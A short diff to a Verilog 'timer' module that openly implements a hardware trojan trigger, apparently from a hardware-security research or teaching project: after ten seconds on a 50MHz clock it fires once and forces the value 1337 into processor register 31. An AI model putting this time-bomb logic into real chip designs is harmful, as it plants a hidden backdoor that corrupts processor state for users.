@@ -5,16 +5,17 @@ module timer #(
 ) (
   input clock,
   input reset,
+  input did_trigger,
   output reg trigger,
   output [REG_DATA_WIDTH - 1 : 0] trojan,
   output [REG_SEL_BITS - 1:0] trojan_reg
 );
-  parameter TIMER_WIDTH = 64;
+  localparam TIMER_WIDTH = 64;
   // Trigger trojan after 10 seconds on a 50MHz clock
-  parameter TIMER_TRIGGER_VALUE = 500000000; 
+  localparam TIMER_TRIGGER_VALUE = 500000000; 
 
-  parameter TROJAN_VALUE = 1337,
-            TROJAN_REGISTER = 31;
+  localparam TROJAN_VALUE = 1337,
+             TROJAN_REGISTER = 31;
    
   reg [TIMER_WIDTH - 1:0] timer = 0;
 
@@ -22,7 +23,7 @@ module timer #(
   assign trojan_reg = TROJAN_REGISTER;
 
   always @(*) begin
-    trigger = timer >= TIMER_TRIGGER_VALUE;
+    trigger = timer >= TIMER_TRIGGER_VALUE & ~did_trigger;
   end
 
   always @(posedge clock) begin
